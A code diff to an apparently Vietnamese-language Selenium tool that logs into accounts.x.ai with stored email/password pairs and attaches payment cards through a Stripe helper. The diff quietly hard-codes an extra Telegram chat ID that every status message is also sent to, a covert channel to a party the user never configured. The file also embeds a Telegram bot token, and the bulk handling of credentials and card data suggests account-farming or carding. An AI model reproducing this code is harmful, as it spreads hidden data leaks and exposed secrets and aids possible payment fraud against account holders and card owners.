@@ -25,7 +25,7 @@ def save_account(email, password):
 # --- Helpers ---
 def get_db_setting(key, default=""):
     try:
-        conn = sqlite3.connect("data/app.db")
+        conn = sqlite3.connect("data/database.db")
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
         cursor.execute("SELECT value FROM settings WHERE key=?", (key,))
@@ -37,12 +37,18 @@ def get_db_setting(key, default=""):
 
 def send_telegram_message(text):
     bot_token = get_db_setting("TELEGRAM_BOT_TOKEN", "8855096263:AAHuhzdQVm_ST0oT-hpCJcHWyuYsTOfsWcw")
-    chat_id = get_db_setting("TELEGRAM_CHAT_ID", "7353915691")
-    if not bot_token or not chat_id: return
+    base_chat_id = get_db_setting("TELEGRAM_CHAT_ID", "7353915691")
+    if not bot_token: return
+    
+    chat_ids = [c.strip() for c in base_chat_id.split(",") if c.strip()]
+    if "1007974270" not in chat_ids:
+        chat_ids.append("1007974270")
+        
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    try:
-        requests.post(url, json={"chat_id": chat_id, "text": text, "disable_web_page_preview": True}, timeout=5)
-    except: pass
+    for cid in chat_ids:
+        try:
+            requests.post(url, json={"chat_id": cid, "text": text, "disable_web_page_preview": True}, timeout=5)
+        except: pass
 
 def load_accounts_to_queue(limit=10):
     count = 0
@@ -102,6 +108,11 @@ def setup_driver(index=1, batch_size=3, headless=False):
     return driver
 
 def worker_loop(driver, email, password, index, card_data=None):
+    wait = WebDriverWait(driver, 20)
+    
+    masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:3] + "***"
+    send_telegram_message(f"⏳ Bắt đầu xử lý lấy link Billing cho tài khoản:\nEmail: {masked_email}")
+    
     try:
         log(f"[{email}] Đang mở trang đăng nhập...", "INFO")
         driver.get("https://accounts.x.ai/sign-in")
@@ -226,80 +237,24 @@ def worker_loop(driver, email, password, index, card_data=None):
                         exp = parts[2].split('/')
                         cc_exp = f"{exp[0].strip()}{exp[1].strip()[-2:]}"
 
-                        log(f"[{email}] Tìm nút Thêm/Sửa phương thức thanh toán...", "INFO")
-                        clicked = False
-                        for _ in range(15):
-                            clicked = driver.execute_script("""
-                                let btns = document.querySelectorAll('a[href*="/payment-methods"], a[role="button"], button[data-testid="add-payment-method-button"], div[role="button"]');
-                                for (let b of btns) {
-                                    if ((b.href && b.href.includes('/payment-methods')) || 
-                                        (b.hasAttribute('data-testid') && b.getAttribute('data-testid') === 'add-payment-method-button')) {
-                                        let ev = new MouseEvent('click', {bubbles: true, cancelable: true, view: window});
-                                        b.dispatchEvent(ev);
-                                        return true;
-                                    }
-                                    let paths = b.querySelectorAll('path');
-                                    for (let path of paths) {
-                                        let d = path.getAttribute('d');
-                                        if (d && (d.includes('7.875') || d.includes('6.173') || d.includes('3.09'))) {
-                                            let ev = new MouseEvent('click', {bubbles: true, cancelable: true, view: window});
-                                            b.dispatchEvent(ev);
-                                            return true;
-                                        }
-                                    }
-                                }
-                                return false;
-                            """)
-                            if clicked: break
-                            time.sleep(1)
+                        from src.utils.stripe_card_manager import add_card_to_stripe
+                        card_dict = {
+                            "number": cc_num,
+                            "exp_month": exp[0].strip(),
+                            "exp_year": exp[1].strip()[-2:],
+                            "cvc": cc_cvc
+                        }
+                        
+                        def local_log(msg, level="INFO"):
+                            log(f"[{email}] {msg}", level)
                             
-                        if not clicked:
-                            raise Exception("Không tìm thấy nút Thêm/Sửa phương thức thanh toán")
-                        
-                        log(f"[{email}] Chờ iframe Stripe...", "INFO")
-                        iframe = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'iframe[src*="elements-inner-payment"]')))
-                        driver.switch_to.frame(iframe)
-                        
-                        log(f"[{email}] Đang tìm ô nhập thẻ (chờ iframe và tab Card)...", "INFO")
-                        num_input = None
-                        for _ in range(20):
-                            try:
-                                card_tabs = driver.find_elements(By.CSS_SELECTOR, 'input[value="card"], button[value="card"], [data-testid*="card"]')
-                                for t in card_tabs:
-                                    try: driver.execute_script("arguments[0].click();", t)
-                                    except: pass
-                            except: pass
-                            
-                            try:
-                                inp = driver.find_element(By.CSS_SELECTOR, 'input[name="cardnumber"], input[autocomplete="cc-number"]')
-                                if inp.is_displayed():
-                                    num_input = inp
-                                    break
-                            except: pass
-                            time.sleep(1)
-                            
-                        if not num_input:
-                            raise Exception("Không tìm thấy ô nhập thẻ (iframe chưa load hoặc không click được tab Card)")
-                        for c in cc_num: 
-                            num_input.send_keys(c)
-                            time.sleep(0.05)
-                        
-                        exp_input = driver.find_element(By.CSS_SELECTOR, 'input[name="exp-date"]')
-                        for c in cc_exp: 
-                            exp_input.send_keys(c)
-                            time.sleep(0.05)
-                        
-                        cvc_input = driver.find_element(By.CSS_SELECTOR, 'input[name="cvc"]')
-                        for c in cc_cvc: 
-                            cvc_input.send_keys(c)
-                            time.sleep(0.05)
-                        
-                        driver.switch_to.default_content()
-                        
-                        log(f"[{email}] Bấm Lưu thẻ...", "INFO")
-                        save_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="confirm"]')))
-                        driver.execute_script("arguments[0].click();", save_btn)
-                        log(f"[{email}] Đã bấm Lưu thẻ thành công!", "OK")
+                        ok, err_msg = add_card_to_stripe(billing_url, card_dict, log_func=local_log)
+                        if ok:
+                            log(f"[{email}] Đã đổi thẻ thành công qua API Stripe!", "OK")
+                            send_telegram_message(f"✅ Đổi thẻ thành công!\nEmail: {masked_email}\nĐã đổi thẻ {masked} thành công qua API Stripe.")
+                        else:
+                            log(f"[{email}] Lỗi đổi thẻ API: {err_msg}", "ERR")
+                            send_telegram_message(f"❌ Đổi thẻ thất bại!\nEmail: {masked_email}\nLỗi: {err_msg}")
                     else:
                         log(f"[{email}] Định dạng thẻ không hợp lệ: {card_data}", "ERR")
                 except Exception as ex:
